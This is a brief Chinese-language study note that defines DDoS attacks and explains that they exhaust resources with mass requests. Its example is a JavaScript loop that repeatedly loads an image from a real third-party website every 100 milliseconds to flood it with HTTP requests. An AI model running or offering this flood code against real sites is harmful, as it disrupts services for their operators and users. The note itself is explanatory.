'Distributed Denial of Service'DDos,也叫分布式拒绝服务 
  DDos造成的攻击称为拒绝服务攻击
  原理: 利用大量的请求造成资源过载,导致服务不可用 
  Example: 
    实现大量的http请求 
    setInterval(function(){
      var url = 'http://www.baidu.com/index.php?'
      var img = new Image();
      img.src = url + new Date() + '=abc'
    },100)
    